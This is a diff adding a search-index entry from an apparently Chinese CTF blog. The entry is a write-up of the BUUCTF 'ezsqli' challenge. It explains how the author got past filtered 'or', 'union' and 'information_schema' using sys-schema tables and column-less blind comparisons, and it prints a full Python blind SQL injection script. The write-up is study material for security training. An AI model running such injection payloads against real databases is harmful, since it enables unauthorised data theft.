@@ -1,6 +1,133 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>i春秋新春战‘疫’复现</title>
+    <url>/2020/03/04/I%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E6%88%98%E2%80%98%E7%96%AB%E2%80%99%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="i春秋新春战‘疫’WEB复现"><a href="#i春秋新春战‘疫’WEB复现" class="headerlink" title="i春秋新春战‘疫’WEB复现"></a><strong>i春秋新春战‘疫’WEB复现</strong></h1><p>这个假期过得确实太颓了，再不学习是真的要凉凉。</p>
+<p>反思反思反思…</p>
+<p>还是做题太少了。</p>
+<h2 id="ezsqli"><a href="#ezsqli" class="headerlink" title="ezsqli"></a>ezsqli</h2><p>首先常规输下1,2回显不同</p>
+<img src="/2020/03/04/I春秋新春战‘疫’复现/1.png" srcset="/img/loading.gif" title="image">
+
+<p>输入1 or 回显SQL Injection Checked.</p>
+<p>这里or被过滤（其实这里直接or返回的是bool(false)，可能间接说明用的不是preg_match?没想清楚是怎么写的，参考别人的wp应该是题目与原题有出入）</p>
+<img src="/2020/03/04/I春秋新春战‘疫’复现/2.png" srcset="/img/loading.gif" title="image">
+
+<p>fuzz一下过滤了的关键词</p>
+<img src="/2020/03/04/I春秋新春战‘疫’复现/3.png" srcset="/img/loading.gif" title="image">
+
+<p>其中的information被过滤意味着我们常规的查表语句无法使用，就需要有其他数据库来代替它：</p>
+<p>MySQL5.7的新增了sys schemma，基础数据来自于performance_schema和information_schema两个库，本身数据库不存储数据。（需要root权限）</p>
+<p><strong>sys.schema_auto_increment_columns</strong></p>
+<p><strong>schema_table_statistics_with_buffer</strong></p>
+<p><strong>x$schema_table_statistics_with_buffer</strong></p>
+<p><strong>sys.x$schema_flattened_keys</strong></p>
+<p>…</p>
+<p>诸如此类还有很多能应用的库。</p>
+<p>参考：<a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512</a></p>
+<p>可是这个库不包含列名，所以又涉及到无列名注入的知识点。</p>
+<p>但无列名注入通常依托union来实现，而这里的union也被过滤了（原题情况是union select不能连用）。</p>
+<p>如果表中仅有一列：substr((select * from table),1,1)=‘x’即可实现目的。</p>
+<p>但本题中不止一列，需要将查询语句与相同数量的列进行比较，进行盲注 。</p>
+<p>例如：</p>
+<pre><code>执行select (select '1','e~')&gt;(select * from table2 limit 1)显示0
+执行select (select '1','f~')&gt;(select * from table2 limit 1)显示1
+执行select (select '1','fl~')&gt;(select * from table2 limit 1)显示1
+所以可以进行盲注</code></pre><p>但问题在于，mysql默认不区分大小写，因此这种形式只有在flag仅为大/小写时适用。（比如本题）</p>
+<p>而区分大小写需要使用 <strong>SELECT CONCAT(“A”, CAST(0 AS JSON))</strong> 来另其返回二进制字符串。</p>
+<p>综上，脚本如下</p>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf8 -*-</span>
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> string
+url <span class="token operator">=</span> <span class="token string">"http://55e66a5c-d66a-4320-bf74-210dd4750bd7.node3.buuoj.cn/index.php"</span>
+
+<span class="token keyword">def</span> <span class="token function">exp1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    str1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'0123456789'</span><span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>punctuation<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
+    flag <span class="token operator">=</span> <span class="token string">''</span>
+    select <span class="token operator">=</span> <span class="token string">'select group_concat(table_name) from sys.x$schema_flattened_keys'</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> str1<span class="token punctuation">:</span>
+            paylaod <span class="token operator">=</span> <span class="token string">"1 &amp;&amp; (select substr(({}),{},1))='{}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>select<span class="token punctuation">,</span> j<span class="token punctuation">,</span> i<span class="token punctuation">)</span>
+            <span class="token comment" spellcheck="true">#print(paylaod)</span>
+            data <span class="token operator">=</span> <span class="token punctuation">{</span>
+                <span class="token string">'id'</span><span class="token punctuation">:</span> paylaod<span class="token punctuation">,</span>
+            <span class="token punctuation">}</span>
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                flag <span class="token operator">+=</span> i
+                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+
+<span class="token keyword">def</span> <span class="token function">exp2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#区分大小写(应该是环境有问题 跑不出)</span>
+    str1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'-0123456789'</span><span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_uppercase<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span>string<span class="token punctuation">.</span>punctuation<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
+    flag <span class="token operator">=</span> <span class="token string">''</span>
+    flag_table_name <span class="token operator">=</span> <span class="token string">'f1ag_1s_h3r3_hhhhh'</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> str1<span class="token punctuation">:</span>
+            i <span class="token operator">=</span> flag<span class="token operator">+</span>i
+            paylaod <span class="token operator">=</span> <span class="token string">"1&amp;&amp;((select 1,concat('{}~',CAST('0' as json))) &lt; (select * from {}))"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>flag_table_name<span class="token punctuation">)</span>
+            <span class="token comment" spellcheck="true">#print(paylaod)</span>
+            data <span class="token operator">=</span> <span class="token punctuation">{</span>
+                <span class="token string">'id'</span><span class="token punctuation">:</span> paylaod<span class="token punctuation">,</span>
+            <span class="token punctuation">}</span>
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+
+            <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token operator">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                flag<span class="token operator">=</span>i
+                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+<span class="token keyword">def</span> <span class="token function">exp3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#不区分大小写</span>
+    flag <span class="token operator">=</span> <span class="token string">''</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> n <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            a<span class="token operator">=</span>chr<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hex<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            payload <span class="token operator">=</span> <span class="token string">"1&amp;&amp;((select 1,0x%s7e)>(select * from f1ag_1s_h3r3_hhhhh))"</span><span class="token operator">%</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hex<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>a<span class="token punctuation">)</span>
+            data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span>
+            req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token keyword">in</span> req<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
+                flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    exp1<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    exp2<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    exp3<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>参考：<a href="https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/" target="_blank" rel="noopener">https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/</a></p>
+<p><a href="https://blog.csdn.net/a3320315/article/details/104476566" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104476566</a></p>
+<p><a href="https://blog.csdn.net/qq_42967398/article/details/104472352?fps=1&amp;locationNum=2" target="_blank" rel="noopener">https://blog.csdn.net/qq_42967398/article/details/104472352?fps=1&amp;locationNum=2</a></p>
+<p><strong>持续更新…</strong></p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <categories>
+        <category>ctfweb</category>
+      </categories>
+      <tags>
+        <tag>BUUCTF</tag>
+        <tag>无列名无unionselect注数据</tag>
+        <tag>无in注表名</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HASH长度扩展攻击</title>
     <url>/2019/11/30/md5%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</url>
     <content><![CDATA[<p>因为遇到了相关题目，下面以md5为例，写一下md5的工作原理和对hash扩展攻击的理解。<a id="more"></a></p>
